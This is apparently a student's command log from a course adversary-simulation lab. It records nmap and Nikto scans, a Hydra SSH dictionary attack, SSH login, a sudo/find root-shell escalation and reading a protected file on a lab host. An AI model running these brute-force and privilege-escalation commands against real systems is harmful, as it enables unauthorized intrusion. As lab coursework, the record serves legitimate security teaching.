# **Commands Used**

**This document lists the main commands I executed during the CY376 Adversary Simulation project, grouped according to each phase of the engagement.**





## 

## Phase 1 – Reconnaissance



**1.ast Nmap Scan**

*nmap -sV -sC -F 192.168.102.129*



**Purpose:**

Identify open ports

Detect service versions

Run default NSE scripts







**2.Full Nmap Scan**

*nmap -sV -sC -p- 192.168.102.129*



**Purpose:**



Scan all TCP ports

Verify exposed services

Confirm scan consistency



**3.Nikto Web Enumeration**

*nikto -h http://192.168.102.129*



**Purpose:**



Enumerate web server vulnerabilities

Identify missing security headers

Detect configuration issues





## Phase 2 – Initial Access



**1.Hydra Dictionary Attack**

*hydra -l sysadmin -P passwords.txt 192.168.102.129 ssh*



**Purpose:**



Perform a dictionary attack against the SSH service

Recover valid credentials



**2.SSH Login**

*ssh sysadmin@192.168.102.129*



Purpose:



Establish an interactive shell on the target using the recovered credentials





## Phase 3 – Privilege Escalation

**1.Enumerate Sudo Privileges**

*sudo -l*



**Purpose:**



Identify commands executable with elevated privileges



**2.Exploit sudo/find Misconfiguration**

*sudo find . -exec /bin/sh \\; -quit*



**Purpose:**



Spawn a root shell using the NOPASSWD sudo rule on the find binary



## Phase 4 – Objective

**1.Read the Simulated Sensitive File**

*cat /root/sensitive/objective.txt*



**Purpose:**



Access the protected objective file after obtaining root privileges



## Additional Command Attempt

**Gobuster Directory Enumeration**

*gobuster dir -u http://192.168.102.129 -w /usr/share/wordlists/dirb/common.txt*



**Purpose:**



Attempt to enumerate hidden directories on the DVWA web application.



Result:



*The command was not successfully executed due to a local Gobuster installation/configuration issue and was excluded from the primary attack chain.*

















